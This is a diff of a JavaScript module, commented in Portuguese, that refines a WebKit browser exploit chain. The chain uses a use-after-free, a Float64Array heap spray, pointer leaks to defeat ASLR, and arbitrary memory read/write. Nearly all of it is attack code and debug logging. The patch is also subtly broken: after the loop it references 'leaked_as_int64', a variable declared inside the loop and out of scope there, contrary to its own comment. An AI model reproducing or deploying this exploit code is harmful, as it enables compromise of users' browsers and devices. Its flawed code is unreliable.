@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v157 - Correção do erro de digitação da variável de loop)
+// js/script3/testArrayBufferVictimCrash.mjs (v158 - Correção de Escopo de Variáveis)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,7 +26,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v157_FIX_TYPO";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v158_FIX_SCOPE";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -408,6 +408,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             let webkit_base_address = null;
             let found_m_mode = null;
 
+            // Variáveis de escopo para a tentativa atual
+            let expected_spray_int64 = null;
+            let initial_fill_int64 = null;
+
             try {
                 logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
                 clearOOBEnvironment({ force_clear_even_if_not_setup: true });
@@ -480,6 +484,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     const initial_victim_fill_value = dangling_info.initial_victim_fill_value;
                     const spray_value_double_to_leak_ptr = dangling_info.spray_value_double_to_leak_ptr; // Acessar do objeto retornado
 
+                    // Definir expected_spray_int64 e initial_fill_int64 aqui
+                    expected_spray_int64 = _doubleToInt64_direct(spray_value_double_to_leak_ptr);
+                    initial_fill_int64 = _doubleToInt64_direct(initial_victim_fill_value);
+
                     if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
                         logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
                         throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
@@ -490,8 +498,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     for (let i = 0; i < attempts_read_dangling; i++) {
                         leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento
                         const leaked_as_int64 = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
-                        const expected_spray_int64 = _doubleToInt64_direct(spray_value_double_to_leak_ptr);
-                        const initial_fill_int64 = _doubleToInt64_direct(initial_victim_fill_value);
                         
                         logFn(`[UAF LEAK] Leitura RAW de dangling_ref[0] (tentativa ${i+1}/${attempts_read_dangling}): ${toHex(leaked_as_int64, 64)} (Double: ${leaked_jsvalue_from_uaf_double})`, "debug");
                         logFn(`[UAF LEAK] Esperado (Spray): ${toHex(expected_spray_int64, 64)}, Inicial (Vítima): ${toHex(initial_fill_int64, 64)}`, "debug");
@@ -513,7 +519,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                         await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                     }
 
-                    if (!found_non_zero || !(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double).equals(expected_spray_int64))) {
+                    if (!found_non_zero || !(leaked_as_int64.equals(expected_spray_int64))) { // Usar as variáveis de escopo
                          throw new Error(`Ponteiro vazado do UAF é inválido ou não o valor pulverizado. Reocupação de heap falhou.`);
                     }
 
